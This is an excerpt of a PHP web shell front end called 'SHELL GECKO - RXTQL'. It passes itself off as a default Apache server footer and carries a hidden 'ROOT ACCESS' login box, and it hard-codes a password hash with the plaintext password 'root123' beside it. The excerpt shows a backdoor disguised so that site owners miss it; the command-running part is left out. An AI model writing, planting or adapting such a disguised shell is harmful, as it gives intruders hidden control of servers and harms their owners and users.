...
// Ganti dengan hash password kamu
$hashed_password = '$2y$10$AM7fWLV/gwS9OW9o1gV9iugwjpXjOxC8iJfoYD8Yl2H0VgLOD4ZQ2'; // password: root123
$login_error = '';
...
<body>
    ...
    <hr>
    <address>Apache/2.4.41 (Ubuntu) Server at <?= htmlspecialchars($_SERVER['SERVER_NAME']) ?> Port <?= $_SERVER['SERVER_PORT'] ?></address>

    <div id="loginBox" style="display:none;position:fixed;z-index:9999;top:50%;left:50%;transform:translate(-50%,-50%);
        background:black;color:lime;padding:20px;border:2px solid lime;border-radius:6px;font-family:monospace;">
        <form method="post">
            <h3>// ROOT ACCESS //</h3>
            <?php if (!empty($login_error)) echo "<p style='color:red;'>$login_error</p>"; ?>
            <input type="password" name="password" placeholder="Enter passphrase"
                   style="background:black;border:1px solid lime;color:lime;padding:5px 8px;margin:5px 0;width:220px;"><br>
            <button type="submit" style="background:lime;color:black;padding:5px 10px;border:none;cursor:pointer;">
                LOGIN
            </button>
        </form>
    </div>
...
<head> 
    ...
    <title>SHELL GECKO - RXTQL [ <?= $_SERVER['SERVER_NAME']; ?> ]</title> 
